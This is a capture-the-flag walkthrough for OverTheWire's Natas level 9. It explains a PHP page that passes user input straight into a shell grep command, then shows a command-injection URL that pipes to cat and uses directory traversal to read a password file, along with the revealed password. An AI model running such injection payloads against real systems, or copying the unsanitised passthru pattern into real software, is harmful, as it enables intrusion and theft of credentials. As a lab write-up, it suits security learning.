# Level 8 - Level 9: Natas - OverTheWire

## Level Goal

Username: natas9
URL:      http://natas9.natas.labs.overthewire.org

## Solution
As these levels start getting more complicated, I am going to use the web browser more often to speed up navigation. For this level, we have another input form and sourcecode:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

From what I see, it appears that the value we submit in the input form will be passed as the `needle` request parameter. This value will then be executed on the webserver using the PHP `passthru()` function. A `grep` command will then be executed, searching for our input in a `dictionary.txt` file.

The `passthru()` function is similar to the `exec()` function in that it executes a command, both of which are often susceptible to command injetion attacks when not handled with **extreme** caution.

We can verify this is the case by requesting `http://natas9.natas.labs.overthewire.org/?needle=test`, which offers several results of words in the `dictionary.txt` file that include `test`:

```html
Output:
<pre>
Protestant
Protestant's
Protestants
abruptest
```

Now, to test if this is vulnerable, we can try adding a flag to `grep`. For example, searching `test` gives us several results that include the `test` characters. If we add ` -v` to the request, it will invert the match, so we should see hundreds of results that **do not** include `test`:

`http://natas9.natas.labs.overthewire.org/?needle=test%20-v` returns:

```html
Output:
<pre>

African
Africans
Allah
Allah's
American
Americanism
```

## Exploit payload

Since we were able to "inject" an additional flag to the executed command, this looks like it may be vulnerable!

To skip the trial and error, I eventually found out it was possible to pipe the end of the command (`|`) and execute the `cat` command. Using a similar directory traversal attack like in `Level 06 - 07`, we can `cat` the `../../../../etc/natas_webpass/natas10` file to reveal the password.

In the below URL, notice the spaces are URL-encoded to `%20`:

`http://natas9.natas.labs.overthewire.org/?needle=test%20|%20cat%20../../../../etc/natas_webpass/natas10`

And we get the following output, containing the password:

```html
Output:
<pre>
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

African
Africans
Allah
Allah's
...
...
...
```